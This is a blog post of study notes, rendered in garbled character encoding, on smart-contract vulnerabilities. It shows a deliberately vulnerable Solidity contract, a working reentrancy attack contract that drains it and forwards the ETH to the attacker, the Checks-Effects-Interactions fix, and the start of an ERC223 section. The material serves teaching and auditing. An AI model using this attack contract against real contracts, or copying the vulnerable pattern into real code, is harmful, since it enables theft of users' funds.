<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>åŸºç¡€æ¼æ´æ€»ç»“1 | EIGHTJIU</title><meta name="author" content="kizy"><meta name="copyright" content="kizy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ä¹‹å‰å­¦çš„æ¯”è¾ƒä¹±ï¼Œç°åœ¨å¤ä¹ æ•´ç†ä¸€ä¸‹ã€‚ é‡å…¥re-entrancyé‡å…¥æ”»å‡»æ˜¯æŒ‡åœ¨åˆçº¦æ‰§è¡Œå¤–éƒ¨è°ƒç”¨ï¼ˆé€šå¸¸æ˜¯å‘å¤–å‘é€ä»¥å¤ªæˆ–è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ï¼‰æ—¶ï¼Œæ¥æ”¶æ–¹åœ¨è¯¥å¤–éƒ¨è°ƒç”¨çš„æ‰§è¡Œæµç¨‹ä¸­å†æ¬¡è°ƒç”¨å›åŸåˆçº¦çš„æŸä¸ªå‡½æ•°ï¼Œå¹¶å€Ÿæ­¤åœ¨åŸåˆçº¦æœªå®ŒæˆçŠ¶æ€æ›´æ–°ä¹‹å‰é‡å¤åˆ©ç”¨å…¶å°šæœªæ›´æ–°çš„çŠ¶æ€ï¼Œä»è€Œç›—å–èµ„é‡‘æˆ–ç ´åçŠ¶æ€ä¸€è‡´æ€§ã€‚   æ¢å¥è¯è¯´ï¼šåˆçº¦ A åœ¨æ‰§è¡Œåˆ°â€œå¯¹å¤–è°ƒç”¨â€å¹¶ç­‰å¾…è¿”å›æ—¶ï¼Œè¢«å¤–éƒ¨åˆçº¦ B å›è°ƒå› Aï¼Œåˆ©ç”¨ A å°šæœªå®Œæˆçš„å†…éƒ¨é€»è¾‘ï¼ˆæ¯”">
<meta property="og:type" content="article">
<meta property="og:title" content="åŸºç¡€æ¼æ´æ€»ç»“1">
<meta property="og:url" content="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/index.html">
<meta property="og:site_name" content="EIGHTJIU">
<meta property="og:description" content="ä¹‹å‰å­¦çš„æ¯”è¾ƒä¹±ï¼Œç°åœ¨å¤ä¹ æ•´ç†ä¸€ä¸‹ã€‚ é‡å…¥re-entrancyé‡å…¥æ”»å‡»æ˜¯æŒ‡åœ¨åˆçº¦æ‰§è¡Œå¤–éƒ¨è°ƒç”¨ï¼ˆé€šå¸¸æ˜¯å‘å¤–å‘é€ä»¥å¤ªæˆ–è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ï¼‰æ—¶ï¼Œæ¥æ”¶æ–¹åœ¨è¯¥å¤–éƒ¨è°ƒç”¨çš„æ‰§è¡Œæµç¨‹ä¸­å†æ¬¡è°ƒç”¨å›åŸåˆçº¦çš„æŸä¸ªå‡½æ•°ï¼Œå¹¶å€Ÿæ­¤åœ¨åŸåˆçº¦æœªå®ŒæˆçŠ¶æ€æ›´æ–°ä¹‹å‰é‡å¤åˆ©ç”¨å…¶å°šæœªæ›´æ–°çš„çŠ¶æ€ï¼Œä»è€Œç›—å–èµ„é‡‘æˆ–ç ´åçŠ¶æ€ä¸€è‡´æ€§ã€‚   æ¢å¥è¯è¯´ï¼šåˆçº¦ A åœ¨æ‰§è¡Œåˆ°â€œå¯¹å¤–è°ƒç”¨â€å¹¶ç­‰å¾…è¿”å›æ—¶ï¼Œè¢«å¤–éƒ¨åˆçº¦ B å›è°ƒå› Aï¼Œåˆ©ç”¨ A å°šæœªå®Œæˆçš„å†…éƒ¨é€»è¾‘ï¼ˆæ¯”">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kizzy899.github.io/aaaset/cover_8.jpg">
<meta property="article:published_time" content="2025-10-13T05:45:36.000Z">
<meta property="article:modified_time" content="2025-10-13T08:13:14.869Z">
<meta property="article:author" content="kizy">
<meta property="article:tag" content="åˆçº¦å®¡è®¡">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kizzy899.github.io/aaaset/cover_8.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "åŸºç¡€æ¼æ´æ€»ç»“1",
  "url": "https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/",
  "image": "https://kizzy899.github.io/aaaset/cover_8.jpg",
  "datePublished": "2025-10-13T05:45:36.000Z",
  "dateModified": "2025-10-13T08:13:14.869Z",
  "author": [
    {
      "@type": "Person",
      "name": "kizy",
      "url": "https://kizzy899.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/tubiao.png"><link rel="canonical" href="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'åŸºç¡€æ¼æ´æ€»ç»“1',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/aaaset/page.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/aaaset/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> Search</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></li><li><a class="site-page child" href="/star/"><i class="fa-fw fas fa-star"></i><span> star</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/aaaset/cover_8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">EIGHTJIU</span></a><a class="nav-page-title" href="/"><span class="site-name">åŸºç¡€æ¼æ´æ€»ç»“1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> Search</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></li><li><a class="site-page child" href="/star/"><i class="fa-fw fas fa-star"></i><span> star</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">åŸºç¡€æ¼æ´æ€»ç»“1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-10-13T05:45:36.000Z" title="å‘è¡¨äº 2025-10-13 13:45:36">2025-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-10-13T08:13:14.869Z" title="æ›´æ–°äº 2025-10-13 16:13:14">2025-10-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>ä¹‹å‰å­¦çš„æ¯”è¾ƒä¹±ï¼Œç°åœ¨å¤ä¹ æ•´ç†ä¸€ä¸‹ã€‚</p>
<h1 id="é‡å…¥re-entrancy"><a href="#é‡å…¥re-entrancy" class="headerlink" title="é‡å…¥re-entrancy"></a>é‡å…¥re-entrancy</h1><p>é‡å…¥æ”»å‡»æ˜¯æŒ‡åœ¨åˆçº¦æ‰§è¡Œå¤–éƒ¨è°ƒç”¨ï¼ˆé€šå¸¸æ˜¯å‘å¤–å‘é€ä»¥å¤ªæˆ–è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ï¼‰æ—¶ï¼Œæ¥æ”¶æ–¹åœ¨è¯¥å¤–éƒ¨è°ƒç”¨çš„æ‰§è¡Œæµç¨‹ä¸­<strong>å†æ¬¡è°ƒç”¨å›åŸåˆçº¦çš„æŸä¸ªå‡½æ•°</strong>ï¼Œå¹¶å€Ÿæ­¤åœ¨åŸåˆçº¦æœªå®ŒæˆçŠ¶æ€æ›´æ–°ä¹‹å‰é‡å¤åˆ©ç”¨å…¶å°šæœªæ›´æ–°çš„çŠ¶æ€ï¼Œä»è€Œç›—å–èµ„é‡‘æˆ–ç ´åçŠ¶æ€ä¸€è‡´æ€§ã€‚</p>
<blockquote>
<p> æ¢å¥è¯è¯´ï¼šåˆçº¦ A åœ¨æ‰§è¡Œåˆ°â€œå¯¹å¤–è°ƒç”¨â€å¹¶ç­‰å¾…è¿”å›æ—¶ï¼Œè¢«å¤–éƒ¨åˆçº¦ B å›è°ƒå› Aï¼Œåˆ©ç”¨ A å°šæœªå®Œæˆçš„å†…éƒ¨é€»è¾‘ï¼ˆæ¯”å¦‚ä½™é¢æœªæ¸…é›¶ï¼‰é‡å¤è§¦å‘å—å®³é€»è¾‘ã€‚</p>
</blockquote>
<h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>æ¼æ´åˆçº¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EtherStoreVulnerable &#123;</span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // å­˜æ¬¾</span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Need to deposit &gt; 0&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å¯æç°å‡½æ•° â€”â€” è„†å¼±ï¼šå…ˆè¿›è¡Œå¤–éƒ¨è°ƒç”¨ï¼Œå†æ›´æ–°å†…éƒ¨çŠ¶æ€ï¼ˆæ˜“å—é‡å…¥ï¼‰</span><br><span class="line">    function withdrawFunds(uint256 weiToWithdraw) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= weiToWithdraw, &quot;Insufficient balance&quot;);</span><br><span class="line">        require(weiToWithdraw &lt;= withdrawalLimit, &quot;Exceeds withdrawal limit&quot;);</span><br><span class="line">        require(block.timestamp &gt;= lastWithdrawTime[msg.sender] + 1 weeks, &quot;Withdraw not allowed yet&quot;);</span><br><span class="line"></span><br><span class="line">        // è„†å¼±ç‚¹ï¼šå¤–éƒ¨è°ƒç”¨ï¼ˆå‘ msg.sender å‘é€ ETHï¼‰å‘ç”Ÿåœ¨çŠ¶æ€æ›´æ–°ä¹‹å‰</span><br><span class="line">        (bool ok, ) = msg.sender.call&#123;value: weiToWithdraw&#125;(&quot;&quot;);</span><br><span class="line">        require(ok, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // çŠ¶æ€æ›´æ–°æ™šäºå¤–éƒ¨è°ƒç”¨ â€”â€” å¯¼è‡´é‡å…¥å¯ä»¥é‡å¤æç°</span><br><span class="line">        balances[msg.sender] -= weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ä¾¿æ·ï¼šåˆçº¦ä½™é¢æŸ¥çœ‹</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Attack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./EtherStoreVulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStoreVulnerable public etherStore;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public attackAmount = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStoreVulnerable(_etherStoreAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å¯åŠ¨æ”»å‡»ï¼šå…ˆå­˜å…¥ 1 ETHï¼Œç„¶åè°ƒç”¨ withdraw è§¦å‘å›é€€å¹¶åœ¨å›é€€ä¸­é‡å…¥</span><br><span class="line">    function pwnEtherStore() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= attackAmount, &quot;Need to send at least 1 ETH&quot;);</span><br><span class="line"></span><br><span class="line">        // å°† 1 ETH å­˜å…¥å—å®³åˆçº¦</span><br><span class="line">        etherStore.depositFunds&#123;value: attackAmount&#125;();</span><br><span class="line"></span><br><span class="line">        // ç«‹åˆ»æç°ï¼ˆé¦–æ¬¡è§¦å‘å¤–éƒ¨ sendï¼Œå›é€€/receive ä¼šå†æ¬¡è°ƒç”¨ withdrawï¼‰</span><br><span class="line">        etherStore.withdrawFunds(attackAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // å›é€€/receiveï¼šåœ¨æ”¶åˆ° ETH æ—¶å°è¯•å†æ¬¡è°ƒç”¨ withdraw å®ç°é‡å…¥</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // å½“å—å®³åˆçº¦ä»æœ‰ä½™é¢ä¸”æ»¡è¶³æç°é™é¢æ—¶ï¼Œç»§ç»­é‡å…¥æç°</span><br><span class="line">        if (address(etherStore).balance &gt;= attackAmount) &#123;</span><br><span class="line">            // ç»§ç»­é‡å…¥è°ƒç”¨</span><br><span class="line">            etherStore.withdrawFunds(attackAmount);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // å¦åˆ™æŠŠå·æ¥çš„é’±è½¬ç»™æ”»å‡»è€…éƒ¨ç½²è€…</span><br><span class="line">            payable(owner).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ä¾¿æ·ï¼šæå–åˆçº¦å†…çš„ ETHï¼ˆæ”»å‡»è€…è‡ªä¿ï¼‰</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner&quot;);</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æŸ¥çœ‹ä½™é¢</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="æ­£ç¡®çš„ä¿®å¤æ–¹æ³•"><a href="#æ­£ç¡®çš„ä¿®å¤æ–¹æ³•" class="headerlink" title="æ­£ç¡®çš„ä¿®å¤æ–¹æ³•"></a>æ­£ç¡®çš„ä¿®å¤æ–¹æ³•</h3><p><strong>ï¼ˆChecks â€” Effects â€” Interactionsï¼‰</strong></p>
<p>æœ€æ ¹æœ¬çš„åŸåˆ™æ˜¯ <strong>å…ˆæ£€æŸ¥ï¼ˆChecksï¼‰â†’æ›´æ–°åˆçº¦å†…éƒ¨çŠ¶æ€ï¼ˆEffectsï¼‰â†’å†è¿›è¡Œå¤–éƒ¨äº¤äº’ï¼ˆInteractionsï¼‰</strong>ï¼Œç¡®ä¿åœ¨è¿›è¡Œä»»ä½•å¤–éƒ¨è°ƒç”¨ä¹‹å‰æŠŠå†…éƒ¨çŠ¶æ€å˜å®‰å…¨ã€‚</p>
<blockquote>
<p>äº¤æ¢ä¸Šè¿°åˆçº¦çš„â€œæ›´æ–°çŠ¶æ€â€å’Œâ€œè°ƒç”¨å¤–éƒ¨â€éƒ¨åˆ†</p>
</blockquote>
<h2 id="å¦‚ä½•åˆ¤æ–­ä½ çš„åˆçº¦æ˜¯å¦æ˜“è¢«é‡å…¥"><a href="#å¦‚ä½•åˆ¤æ–­ä½ çš„åˆçº¦æ˜¯å¦æ˜“è¢«é‡å…¥" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ä½ çš„åˆçº¦æ˜¯å¦æ˜“è¢«é‡å…¥"></a>å¦‚ä½•åˆ¤æ–­ä½ çš„åˆçº¦æ˜¯å¦æ˜“è¢«é‡å…¥</h2><ul>
<li>æ˜¯å¦åœ¨ä»»ä½•å¤–éƒ¨ <code>call</code>&#x2F;<code>callcode</code>&#x2F;<code>delegatecall</code> ä¹‹å‰æ›´æ–°äº†å…³é”®çŠ¶æ€ï¼Ÿï¼ˆCEIï¼‰</li>
<li>æ˜¯å¦æœ‰å¯¹ä¸å¯ä¿¡åˆçº¦çš„å¤–éƒ¨è°ƒç”¨ï¼Ÿï¼ˆåŒ…æ‹¬å‘é€ ETHã€è°ƒç”¨å¤–éƒ¨åˆçº¦ã€è½¬ ERC777&#x2F;è‡ªå®šä¹‰ tokenï¼‰</li>
<li>æ˜¯å¦ä¸ºå…³é”®å‡½æ•°ä½¿ç”¨äº†äº’æ–¥ä¿æŠ¤ï¼ˆä¾‹å¦‚ OpenZeppelin çš„ <code>nonReentrant</code>ï¼‰ï¼Ÿ</li>
<li>æ˜¯å¦æœ‰å•å…ƒ&#x2F;é›†æˆæµ‹è¯•ç”¨æ¶æ„åˆçº¦æ¨¡æ‹Ÿå›é€€å¹¶è¿›è¡Œé‡å…¥ï¼Ÿï¼ˆå¿…é¡»åšï¼‰</li>
<li>æ˜¯å¦ä½¿ç”¨é™æ€åˆ†æå·¥å…·ï¼ˆSlitherã€Mythril ç­‰ï¼‰æ‰«æé‡å…¥ç›¸å…³å‘Šè­¦ï¼Ÿ</li>
</ul>
<h1 id="ATNæ”»å‡»"><a href="#ATNæ”»å‡»" class="headerlink" title="ATNæ”»å‡»"></a>ATNæ”»å‡»</h1><h2 id="ERC223"><a href="#ERC223" class="headerlink" title="ERC223"></a>ERC223</h2><p><strong>ERC223</strong> æ˜¯å¯¹ <strong>ERC20</strong> çš„ä¸€ä¸ªæ”¹è¿›ææ¡ˆï¼Œç›®æ ‡æ˜¯è§£å†³æŠŠä»£å¸è¯¯å‘åˆ°ä¸æ”¯æŒä»£å¸æ¥æ”¶çš„åˆçº¦æ—¶å¯¼è‡´ä»£å¸â€œä¸¢å¤±â€çš„é—®é¢˜ï¼ˆERC20 åœ¨å‘åˆçº¦å‘é€ä»£å¸æ—¶åªä¼šæ”¹å˜ä½™é¢ï¼Œä¸ä¼šé€šçŸ¥åˆçº¦ï¼Œä½¿åˆçº¦æ— æ³•å¤„ç†ï¼‰ã€‚ERC223 åœ¨è½¬è´¦åˆ°åˆçº¦æ—¶è§¦å‘åˆçº¦å›è°ƒï¼Œä»¥ä¾¿åˆçº¦èƒ½å¤„ç†æ¥æ”¶åˆ°çš„ä»£å¸ï¼Œä»è€Œæé«˜å®‰å…¨æ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<blockquote>
<p>è§£å†³äº†ERC20è°ƒç”¨ä¸¤æ¬¡çš„å°´å°¬</p>
</blockquote>
<h3 id="ä¸ºä»€ä¹ˆ-ERC20-ä¸€æ¬¡è½¬è´¦å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œè€Œ-ERC223-åªéœ€è¦ä¸€æ¬¡ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-ERC20-ä¸€æ¬¡è½¬è´¦å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œè€Œ-ERC223-åªéœ€è¦ä¸€æ¬¡ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ ERC20 ä¸€æ¬¡è½¬è´¦å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œè€Œ ERC223 åªéœ€è¦ä¸€æ¬¡ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ ERC20 ä¸€æ¬¡è½¬è´¦å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œè€Œ ERC223 åªéœ€è¦ä¸€æ¬¡ï¼Ÿ</h3><h3 id="ğŸ”¹-ERC20-çš„ç¼ºé™·"><a href="#ğŸ”¹-ERC20-çš„ç¼ºé™·" class="headerlink" title="ğŸ”¹ ERC20 çš„ç¼ºé™·"></a>ğŸ”¹ ERC20 çš„ç¼ºé™·</h3><p>åœ¨ ERC20 ä¸­ï¼Œå¦‚æœä½ å‘ <strong>æ™®é€šå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰</strong> è½¬è´¦ï¼Œåªéœ€è¦ä¸€æ¬¡ <code>transfer</code> å³å¯ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½ è¦å‘ <strong>åˆçº¦åœ°å€</strong> è½¬è´¦ï¼Œç”±äºåˆçº¦æœ¬èº«æ— æ³•è‡ªåŠ¨æ¥æ”¶ä»£å¸ï¼Œé€šå¸¸éœ€è¦èµ°ä»¥ä¸‹ä¸¤æ­¥ï¼š</p>
<table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>æ“ä½œ</th>
<th>å‡½æ•°</th>
<th>è°è°ƒç”¨ï¼Ÿ</th>
</tr>
</thead>
<tbody><tr>
<td>1ï¸âƒ£</td>
<td>æˆæƒå¯¹æ–¹ï¼ˆåˆçº¦ï¼‰å¯ä»¥èŠ±ä½ çš„ä»£å¸</td>
<td><code>approve(spender, amount)</code></td>
<td>ä»£å¸æŒæœ‰äºº</td>
</tr>
<tr>
<td>2ï¸âƒ£</td>
<td>åˆçº¦å†å»æ‹‰å–æˆæƒçš„ä»£å¸</td>
<td><code>transferFrom(from, to, amount)</code></td>
<td>æ¥æ”¶æ–¹åˆçº¦</td>
</tr>
</tbody></table>
<p>æ‰€ä»¥å¯¹äº <strong>åˆçº¦æ¥æ”¶ä»£å¸çš„æƒ…å†µï¼ŒERC20 è‡³å°‘éœ€è¦è°ƒç”¨ä¸¤æ¬¡å‡½æ•°</strong>ã€‚</p>
<hr>
